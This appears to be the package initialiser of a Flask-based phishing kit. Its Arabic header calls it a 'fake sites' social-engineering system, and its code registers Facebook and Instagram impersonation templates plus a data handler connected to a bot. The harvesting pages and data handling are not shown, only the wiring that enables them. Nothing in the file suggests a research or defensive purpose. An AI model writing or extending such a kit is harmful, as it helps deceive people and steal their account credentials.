# fake_sites/__init__.py
# ============================================================
# نظام المواقع المزيفة — الهندسة الاجتماعية
# v2 — مع Instagram
# ============================================================

from flask import Blueprint

from logging_config import get_logger

logger = get_logger("fake_sites")

fake_sites_bp = Blueprint(
    'fake_sites',
    __name__,
    url_prefix='/fs'
)


def init_fake_sites(app, bot):
    """تسجيل كل الأقسام"""
    from .data_handler import init_data_handler

    # سجل معالج البيانات
    init_data_handler(app, bot)

    # سجل Facebook
    try:
        from .facebook import init_facebook_templates
        init_facebook_templates(app)
        logger.info("[+] Facebook templates registered")
    except Exception as e:
        logger.exception(f"[-] Facebook templates error: {e}")

    # ★ سجل Instagram
    try:
        from .instagram import init_instagram_templates
        init_instagram_templates(app)
        logger.info("[+] Instagram templates registered")
    except Exception as e:
        logger.exception(f"[-] Instagram templates error: {e}")

    logger.info("[+] Fake Sites system initialized")


__all__ = ['fake_sites_bp', 'init_fake_sites']
